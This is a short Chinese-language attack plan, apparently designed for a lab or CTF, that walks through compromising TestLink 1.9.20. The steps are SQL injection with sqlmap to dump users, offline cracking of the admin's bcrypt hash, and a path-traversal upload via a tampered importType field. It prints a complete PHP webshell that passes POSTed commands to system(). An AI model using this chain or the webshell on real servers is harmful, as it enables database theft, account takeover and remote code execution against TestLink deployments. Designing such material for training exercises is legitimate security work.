
# 漏洞设计方案

- 利用条件：普通游客身份
- 利用效果：信息泄露、远程代码执行

### 漏洞利用过程

1. 攻击者利用开发者工具，从返回的消息头的cookie字段可以查看到应用的基础软件的名称为`TESTLINK`基础版本为19.20。攻击者通过网上检索，TESTLINK19.20版本存在的漏洞信息以及漏洞复现报告。例如：[Testlink 1.9.20: Unrestricted file upload and SQL injection](https://ackcent.com/blog/testlink-1.9.20-unrestricted-file-upload-and-sql-injection/)
2. 攻击者可以注册自己的账户，注册的用户身份是游客身份没有权限触发文件上传漏洞上传`webshell`。
3. 攻击者根据网搜索漏洞分析报告说明，使用`sqlmap`工具dump用户信息数据表。
4. 攻击者拿到数据库中存储的管理员的密码信息，通过对`bcrypt`算法加密后的密码的离线爆破的得到管理员用户的密码。
5. 攻击者使用管理员身份登录应用，在管理关键字模块上传包含关键字文件时，利用burp suite工具拦截上传文件的请求：
   - 更改上传请求的`importType`的字段的值为`/../../../logs/xx.php`
   
- 上传文件 `uploadedFile`  的内容替换为攻击者自己精心构造`webshell`
   
     例如：
   
     ```php
     <html>
         <body>
             <form method="POST">
                 <input name="command" id="command" />
                 <input type="submit" value="Send" />
             </form>
             <pre>
                 <?php if(isset($_POST['command']))
             {
                 system($_POST['command']);
             } ?>
             </pre>
         </body>
     </html>
     ```
   
     
   
6. 攻击者访问`http://your-ip:port/logs/xx.php`触发`webshell`，能够在服务器上执行代码。